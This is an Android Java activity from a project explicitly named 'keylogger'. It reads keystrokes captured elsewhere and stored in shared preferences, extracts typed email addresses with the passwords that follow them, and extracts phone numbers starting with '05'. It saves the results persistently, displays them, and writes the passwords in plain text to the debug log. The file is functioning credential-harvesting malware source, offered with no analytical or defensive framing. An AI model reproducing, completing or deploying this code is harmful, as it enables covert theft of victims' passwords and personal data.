package com.example.keylogger;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Dialog;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

import com.google.android.material.button.MaterialButton;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    private TextView pass_txt;
    private TextView number_txt;
    private MaterialButton clear_btn;
    private String input,pass,numbers;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        pass_txt = findViewById(R.id.pass_txt);
        number_txt = findViewById(R.id.number_txt);
        clear_btn = findViewById(R.id.clear_btn);
        clear_btn.setOnClickListener(view -> clearText());
        pass = MSP.getMe().getString("PASS","");
        numbers = MSP.getMe().getString("NUMBERS","");
        number_txt.setText(numbers); //display previous numbers
        pass_txt.setText(pass); //display previous passwords
    }

    private void clearText() {
        Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.popup);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        MaterialButton cancel = dialog.findViewById(R.id.popup_no);
        cancel.setOnClickListener(view -> dialog.dismiss());
        MaterialButton delete = dialog.findViewById(R.id.popup_yes);
        delete.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                MSP.getMe().putString("PASS","");
                MSP.getMe().putString("NUMBERS","");
                pass_txt.setText("");
                number_txt.setText("");
                dialog.dismiss();
            }
        });
        dialog.show();
    }

    private void findPass(){
        Pattern pattern = Pattern.compile("\\w+([\\.-]?\\w+)*@\\w+([\\.-]?\\w+)*(\\.\\w{2,3})+"); //email regex
        Log.d("ccc", "pass "+pass);
        Matcher matcher = pattern.matcher(input);
        while (matcher.find())
        {
            String s = matcher.group();
            int start = input.indexOf(s)+s.length();
            Log.d("ccc", "Email " + s);
            int done= input.indexOf("DONE",start);
            Log.d("ccc", "done " + done);
            if (done != -1){ // DONE not found
                Log.d("ccc", "Pass "+input.substring(start,done));
                pass_txt.append(input.substring(start,done)+"\n");
                MSP.getMe().putString("PASS",pass+input.substring(start,done)+"\n");
                pass = MSP.getMe().getString("PASS","");
            }
        }
    }

    private void findPhoneNumbers(){
        Log.d("ccc", "numbers " + numbers);
        Pattern pattern = Pattern.compile("05\\d{8}"); //phone number regex
        Matcher matcher = pattern.matcher(input);
        while (matcher.find())
        {
            number_txt.append(matcher.group()+"\n");
            Log.d("ccc", "Phone number "+matcher.group());
            MSP.getMe().putString("NUMBERS",numbers+matcher.group()+"\n");
            numbers = MSP.getMe().getString("NUMBERS","");
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        input = MSP.getMe().getString("KEYS","");
        Log.d("ccc", input);
        findPhoneNumbers();
        findPass();
        MSP.getMe().putString("KEYS",""); //clear
        input = "";
    }
}